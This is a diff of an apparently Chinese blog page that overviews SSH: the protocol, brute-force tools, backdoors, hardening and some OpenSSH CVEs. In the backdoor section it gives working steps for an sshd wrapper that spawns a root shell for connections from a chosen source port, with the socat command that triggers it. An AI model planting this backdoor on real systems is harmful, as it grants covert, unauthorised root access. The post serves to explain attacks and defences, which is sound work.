@@ -332,8 +332,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Linux/" itemprop="url" rel="index">
-                    <span itemprop="name">Linux</span>
+                  <a href="/categories/协议-信息安全/" itemprop="url" rel="index">
+                    <span itemprop="name">协议,信息安全</span>
                   </a>
                 </span>
 
@@ -370,17 +370,14 @@
         
           
             <p>[TOC]</p>
-<hr>
-<p>###0x01 SSH 简介</p>
-<p>&emsp;&emsp;SSH（Secure SHell）[^1]是一种网络协议，目前已经成为 Linux 系统的标准配置。SSH 的主要目的是用来取代传统的 telnet 和 R 系列命令（rlogin, rsh, rexec 等），实现对远程登录和远程执行命令的加密，防止由于网络监听而导致的密码泄露等问题。</p>
+<h3 id="0x01-SSH-简介"><a href="#0x01-SSH-简介" class="headerlink" title="0x01 SSH 简介"></a>0x01 SSH 简介</h3><p>&emsp;&emsp;SSH（Secure SHell）[^1]是一种网络协议，目前已经成为 Linux 系统的标准配置。SSH 的主要目的是用来取代传统的 telnet 和 R 系列命令（rlogin, rsh, rexec 等），实现对远程登录和远程执行命令的加密，防止由于网络监听而导致的密码泄露等问题。</p>
 <p>&emsp;&emsp;SSH 协议目前有两个版本：SSH1 和 SSH2，SSH2 的安全性远高于 SSH1。</p>
 <p>&emsp;&emsp;实现 SSH 协议的服务端软件主要有：OpenSSH 和 SSH Communications，前者为免费开源软件，为主流 SSH 软件，后者为商用软件。</p>
 <p>&emsp;&emsp;支持 SSH 协议的客户端软件则较多，常用主要有：Lunix 下的 ssh 命令、Putty、secureCRT、Xshell、Bitvise SSH Client 等。</p>
 <p>&emsp;&emsp;SSH 的登录方式主要有两种：1）用户名口令登录方式；2）基于密钥的登录方式。</p>
 <p>&emsp;&emsp;关于 SSH 协议的具体描述，可参考 RFC4250 ~ 4255。</p>
 <hr>
-<p>###0x02 SSH 协议解析</p>
-<h5 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h5><p>&emsp;&emsp;SSH 协议由三个主要部分组成：传输层协议、验证协议、连接协议。</p>
+<h3 id="0x02-SSH-协议解析"><a href="#0x02-SSH-协议解析" class="headerlink" title="0x02 SSH 协议解析"></a>0x02 SSH 协议解析</h3><h5 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h5><p>&emsp;&emsp;SSH 协议由三个主要部分组成：传输层协议、验证协议、连接协议。</p>
 <ul>
 <li><p>传输层协议：提供服务器验证、保密性和完整性，也可选的提供压缩。</p>
 </li>
@@ -434,8 +431,7 @@
 <p>&emsp;&emsp;以 client 到 server 的加密秘钥为例：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">key1 = h(K||H||&quot;C&quot;||SID)</div><div class="line">key2 = h(K||H||key1)</div><div class="line">key3 = h(K||H||key1||key2)</div><div class="line">. . .</div><div class="line">key  = key1||key2||key3|| . . .</div></pre></td></tr></table></figure>
 <hr>
-<p>###0x03 SSH 的攻击方法</p>
-<h5 id="3-1-暴力破解-SSH-密码"><a href="#3-1-暴力破解-SSH-密码" class="headerlink" title="3.1 暴力破解 SSH 密码"></a>3.1 暴力破解 SSH 密码</h5><ol>
+<h3 id="0x03-SSH-的攻击方法"><a href="#0x03-SSH-的攻击方法" class="headerlink" title="0x03 SSH 的攻击方法"></a>0x03 SSH 的攻击方法</h3><h5 id="3-1-暴力破解-SSH-密码"><a href="#3-1-暴力破解-SSH-密码" class="headerlink" title="3.1 暴力破解 SSH 密码"></a>3.1 暴力破解 SSH 密码</h5><ol>
 <li><p><strong>hydra：</strong>        Kali 下分有界面和无界面的。</p>
 </li>
 <li><p><strong>Medusa：</strong>        kali 下命令行工具，最新版本 2.2，2015 年后未再更新。</p>
@@ -450,16 +446,14 @@
 <p>&emsp;&emsp;方法一：分析 ssh 实现软件，寻找随机数生成的脆弱点。</p>
 <p>&emsp;&emsp;方法二：控制机器，按要求生成随机数。</p>
 <hr>
-<p>###0x04 SSH 后门</p>
-<h5 id="4-1-SSH-Server-Wrapper-后门"><a href="#4-1-SSH-Server-Wrapper-后门" class="headerlink" title="4.1 SSH Server Wrapper 后门"></a>4.1 SSH Server Wrapper 后门</h5><p>（1）复制 sshd 到 bin 目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd /usr/sbin</div><div class="line">mv sshd ../bin</div></pre></td></tr></table></figure></p>
+<h3 id="0x04-SSH-后门"><a href="#0x04-SSH-后门" class="headerlink" title="0x04 SSH 后门"></a>0x04 SSH 后门</h3><h5 id="4-1-SSH-Server-Wrapper-后门"><a href="#4-1-SSH-Server-Wrapper-后门" class="headerlink" title="4.1 SSH Server Wrapper 后门"></a>4.1 SSH Server Wrapper 后门</h5><p>（1）复制 sshd 到 bin 目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd /usr/sbin</div><div class="line">mv sshd ../bin</div></pre></td></tr></table></figure></p>
 <p>（2）编辑 sshd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">vi sshd //加入以下内容并保存</div><div class="line">#!/usr/bin/perl</div><div class="line">exec&quot;/bin/sh&quot;if(getpeername(STDIN)=~/^..LF/);</div><div class="line">exec&#123;&quot;/usr/bin/sshd&quot;&#125;&quot;/usr/sbin/sshd&quot;,@ARGV;</div></pre></td></tr></table></figure></p>
 <p>（3）修改权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod 755 sshd</div></pre></td></tr></table></figure></p>
 <p>（4）使用 socat<br>&emsp;&emsp;socat 号称 Linux 下的瑞士军刀，可以实现连接远程端口、远程传递 shell、端口转发等功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat STDIO TCP4:target_ip:22,sourceport=19526</div></pre></td></tr></table></figure></p>
 <p>（5）使用 ssh root@ target_ip 即可免密码登录</p>
 <h5 id="4-2-SSH-公钥免密"><a href="#4-2-SSH-公钥免密" class="headerlink" title="4.2 SSH 公钥免密"></a>4.2 SSH 公钥免密</h5><p>&emsp;&emsp;将本地计算机生成公私钥，将公钥文件复制到服务器上，即可实现免密码登录服务器。</p>
 <hr>
-<p>###0x05 SSH 攻击防护</p>
-<ol>
+<h3 id="0x05-SSH-攻击防护"><a href="#0x05-SSH-攻击防护" class="headerlink" title="0x05 SSH 攻击防护"></a>0x05 SSH 攻击防护</h3><ol>
 <li><p>修改掉默认的 22 端口。</p>
 </li>
 <li><p>禁止 root 用户的 ssh 登录。（使用中一般用普通用户登录，当需要 root 权限时，再切换到 root 用户下）</p>
@@ -472,8 +466,7 @@
 </li>
 </ol>
 <hr>
-<p>###0x06 OpenSSH 的近期漏洞</p>
-<ol>
+<h3 id="0x06-OpenSSH-的近期漏洞"><a href="#0x06-OpenSSH-的近期漏洞" class="headerlink" title="0x06 OpenSSH 的近期漏洞"></a>0x06 OpenSSH 的近期漏洞</h3><ol>
 <li><p>CVE-2016-10009<br>漏洞级别： 中危漏洞<br>适用版本： OpenSSH 版本 &lt; 7.4<br>说　　明： 这个漏洞的利用条件比较苛刻，要求攻击者控制转发 agent-socket，并且需要有被控主机的文件系统写权限。</p>
 </li>
 <li><p>CVE-2016-10010<br>适用版本： OpenSSH 版本 &lt; 7.4<br>漏洞类型： 特权提升漏洞<br>说　　明： <a href="https://www.exploit-db.com" target="_blank" rel="external">https://www.exploit-db.com</a> 上有利用代码。</p>
